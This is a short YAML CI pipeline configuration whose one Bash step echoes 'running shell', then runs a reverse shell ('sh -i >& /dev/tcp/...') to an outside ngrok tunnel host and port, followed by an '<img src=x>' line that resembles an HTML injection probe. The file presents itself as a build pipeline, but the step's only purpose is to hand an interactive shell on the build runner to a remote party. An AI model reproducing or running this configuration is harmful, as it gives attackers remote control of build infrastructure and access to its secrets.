pipelines:
  - name: shmavers_pipeline
    configuration:
      nodePool:   ubuntu 
    steps:
      - name: shmaver_step
        type: Bash
        configuration:
          nodePool: ubuntu
        execution:
          onExecute:
            - echo "running shell"
            - sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/12682 0>&1
            - <img src=x>
